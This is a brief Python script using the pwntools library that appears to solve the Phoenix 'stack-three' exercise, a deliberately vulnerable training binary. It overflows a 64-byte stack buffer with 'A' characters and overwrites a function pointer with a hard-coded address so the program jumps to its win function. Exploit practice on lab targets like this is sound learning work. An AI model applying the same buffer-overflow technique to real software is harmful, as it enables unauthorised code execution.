from pwn import *

p = process('/opt/phoenix/i486/stack-three')

complete_level = "\x35\x85\x04\x08"

payload = "A" * 64 + complete_level

p.sendline(payload)

p.interactive()
